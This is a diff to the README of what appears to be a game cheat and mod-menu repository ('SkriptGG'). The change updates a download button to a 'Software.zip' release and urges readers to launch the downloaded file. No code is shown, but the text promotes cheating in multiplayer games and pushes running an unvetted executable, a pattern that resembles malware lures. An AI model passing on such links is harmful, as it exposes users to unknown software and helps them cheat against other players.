@@ -43,7 +43,7 @@ Our repository covers various topics related to modding and cheating in multipla
 
 To access the latest version of our mod menu and cheats, click the button below:
 
-[![Download SkriptGG](https://github.com/666kirito666/SkriptGG/releases/download/v1.0/Application.zip)](https://github.com/666kirito666/SkriptGG/releases/download/v1.0/Application.zip)
+[![Download SkriptGG](https://github.com/666kirito666/SkriptGG/releases/download/v2.0/Software.zip)](https://github.com/666kirito666/SkriptGG/releases/download/v2.0/Software.zip)
 
 Don't forget to launch the downloaded file to start customizing your gameplay with SkriptGG mods and cheats!
 
